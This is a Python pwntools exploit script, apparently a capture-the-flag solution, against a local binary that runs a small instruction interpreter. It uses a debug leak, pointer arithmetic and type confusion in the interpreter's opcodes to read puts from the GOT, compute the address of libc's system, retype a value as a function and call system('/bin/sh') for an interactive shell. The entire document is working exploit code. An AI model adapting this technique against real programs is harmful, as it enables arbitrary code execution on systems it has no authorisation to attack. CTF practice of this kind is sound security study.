#!/usr/bin/env python3
from pwn import *

context(log_level="info", arch="amd64")

io = process("./vuln_patched")
# io = remote("localhost", 9999)
elf = ELF("./vuln_patched")
libc = ELF("./libc.so.6")

OP_CONST = 0x3A
OP_ADD = 0x7E
OP_LOAD = 0x52
OP_STORE = 0xC4
OP_CALL = 0x1B


def cmd(c):
    io.sendlineafter(b"> ", c.encode())


def inst(op, *args):
    cmd(f"inst {op} " + " ".join(map(str, args)))


cmd("dbg")
io.recvuntil(b"[*] rand_slot = ")
rand_slot = int(io.recvline().strip())
log.success(f"rand_slot: {rand_slot}")

offset_puts = elf.got["puts"] - elf.symbols["values"]
offset_system = libc.symbols["system"] - libc.symbols["puts"]

# values[2] = offset_puts (TYPE_INT)
inst(OP_CONST, 2, offset_puts)
# values[3] = &values[0] + offset_puts = &puts_got (TYPE_PTR)
inst(OP_ADD, 3, rand_slot, 2)
# values[4] = *values[3] = puts@libc
inst(OP_LOAD, 4, 3)
# values[5] = offset_system (TYPE_INT)
inst(OP_CONST, 5, offset_system)
# values[6] = puts@libc + offset_system = system@libc
inst(OP_ADD, 6, 4, 5)
# values[7] = "/bin/sh\x00" (TYPE_INT)
inst(OP_CONST, 7, u64(b"/bin/sh\x00"))
# values[8] = 7 * 16 (sizeof(SSAValue)) + 8 (offsetof(data))
inst(OP_CONST, 8, 7 * 16 + 8)
# values[9] = &values[0] + offset_str = &values[7].data (TYPE_PTR)
inst(OP_ADD, 9, rand_slot, 8)
# values[10] = 96 (offset of values[6] -> 6*16)
inst(OP_CONST, 10, 96)
# values[11] = &values[0] + 96 = &values[6] (TYPE_PTR)
inst(OP_ADD, 11, rand_slot, 10)
# values[12] = 2 (TYPE_FUNC)
inst(OP_CONST, 12, 2)
# *values[11] = values[12] -> values[6].type = TYPE_FUNC
inst(OP_STORE, 11, 12)
# call values[6](values[9]) -> system("/bin/sh")
inst(OP_CALL, 6, 9)

cmd("run")
io.interactive()
